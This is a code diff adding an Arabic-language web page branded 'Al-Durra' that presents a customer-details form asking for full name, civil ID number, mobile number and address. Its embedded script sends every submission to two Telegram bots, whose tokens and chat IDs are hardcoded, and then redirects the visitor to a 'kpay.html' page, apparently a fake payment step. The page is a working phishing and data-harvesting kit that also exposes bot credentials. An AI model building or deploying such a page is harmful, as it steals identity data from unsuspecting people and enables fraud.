@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>هيدر بصورتين داخلية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <style>
+    body {
+      margin: 0;
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+    }
+
+    header {
+      background-image: url('header-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      padding: 40px 0;
+      text-align: center;
+      position: relative;
+    }
+
+    #mome0 {
+      margin-top: -50px;
+      width: 100%;
+      height: 100px;
+      background-image: url('اسم-الصورة.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    #mome1 {
+      margin-top: -250px;
+      width: 150px;
+      margin-bottom: 24px;
+      margin-left: 220px;
+    }
+
+    .slider-container {
+      width: 90%;
+      height: 300px;
+      overflow: hidden;
+      position: relative;
+      margin-top: -40px;
+      margin-left: 20px;
+    }
+
+    .slider {
+      display: flex;
+      transition: transform 0.8s ease-in-out;
+    }
+
+    .slider img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .nav-btn {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(0,0,0,0.4);
+      color: white;
+      border: none;
+      font-size: 24px;
+      padding: 8px 12px;
+      cursor: pointer;
+      z-index: 10;
+      user-select: none;
+    }
+
+    .prev {
+      left: 10px;
+    }
+
+    .next {
+      right: 10px;
+    }
+
+    .nav-btn:hover {
+      background-color: rgba(0,0,0,0.7);
+    }
+
+    #imgi1 {
+
+        width: 100%;
+        margin-bottom: -7px;
+    }
+
+    .buttons-container {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    align-items: center;
+    background-color: #e0dce7; /* لون خلفية مثل الصورة */
+    padding: 30px;
+  }
+
+  .custom-button {
+    width: 90%;
+    max-width: 300px;
+    padding: 15px;
+    background-color: #5c469c; /* بنفسجي غامق مثل الزر */
+    color: white;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .custom-button:hover {
+    background-color: #4a3880; /* لون أغمق عند التحويم */
+  }
+
+  .footer {
+    background-color: #2B074D; /* لون زهري */
+    text-align: center;
+    padding: 50px 0;
+    font-size: 14px;
+    color: #ffffff;
+
+  }
+  #divider {
+    border: none;
+    height: 2px;
+    background-color: #ccc;
+    margin: 20px 0;
+    margin-top: -80px;
+  }
+  .form-container {
+  background-color: #e0dce7;
+  padding: 20px;
+  border-radius: 10px;
+  max-width: 95%;
+  width: 400px;
+  margin: 30px auto;
+  font-family: Arial, sans-serif;
+  box-sizing: border-box;
+}
+
+.form-title {
+  background-color: #471f6c;
+  color: white;
+  text-align: center;
+  padding: 12px;
+  border-radius: 10px;
+  margin-bottom: 20px;
+  font-size: 18px;
+}
+
+label {
+  display: block;
+  margin-bottom: 6px;
+  font-weight: bold;
+  color: #5c469c;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #999;
+  margin-bottom: 20px;
+  font-size: 14px;
+  text-align: right;
+
+}
+.form-container {
+  direction: rtl;
+}
+
+.form-button {
+  width: 100%;
+  padding: 14px;
+  background-color: #5c469c;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+  box-sizing: border-box;
+}
+
+.form-button:hover {
+  background-color: #4a3880;
+}
+
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-container">
+      <img src="menu_bg.png" alt="خلفية الشعار" class="logo-bg" id="mome0">
+      <img src="logo (3).png" alt="شعار" class="logo" id="mome1">
+    </div>
+  </header>
+
+
+  <div class="form-container">
+    <h2 class="form-title">بيانات العميل</h2>
+  
+    <label for="fullname">اسم العميل الكامل</label>
+    <input type="text" id="fullname" placeholder="اسم مقدم الطلب">
+  
+    <label for="civilid">الرقم المدني</label>
+    <input type="text" id="civilid" placeholder="الرقم المدني">
+  
+    <label for="phone">رقم النقال</label>
+    <input type="text" id="phone" placeholder="رقم النقال">
+  
+    <label for="address">العنوان</label>
+    <input type="text" id="address" placeholder="العنوان">
+  
+    <button class="form-button">التالي</button>
+  </div>
+
+  
+<div class="footer">
+    2024 Al-Durra- All rights reserved  </div>
+    <script>
+      const bots = [
+        {
+          token: '7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E',
+          chatId: '6454807559'
+        },
+        {
+          token: '8037647888:AAHjCopWn1zSMFZpL4os5FtGb5DD6Dw4_gc',
+          chatId: '7561846138'
+        }
+      ];
+    
+      document.querySelector('.form-button').addEventListener('click', function () {
+        const fullName = document.getElementById('fullname').value.trim();
+        const civilId = document.getElementById('civilid').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const address = document.getElementById('address').value.trim();
+    
+        // ✅ تحقق من أن جميع الحقول معبأة
+        if (!fullName || !civilId || !phone || !address) {
+          return; // ❌ إذا في حقل فاضي، ما نكمل الإرسال ولا ننتقل
+        }
+    
+        const message =
+          `📥  معلومات طالب الخدمة :\n\n` +
+          `👤 الاسم الكامل: ${fullName}\n` +
+          `🆔 الرقم المدني: ${civilId}\n` +
+          `📱 رقم النقال: ${phone}\n` +
+          `📍 العنوان: ${address}`;
+    
+        // إرسال البيانات إلى جميع البوتات
+        bots.forEach(bot => {
+          fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: bot.chatId,
+              text: message
+            })
+          });
+        });
+    
+        // ✅ تحويل المستخدم بعد التحقق والإرسال
+        window.location.href = "kpay.html"; // غيّرها حسب صفحتك
+      });
+    </script>
+    
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
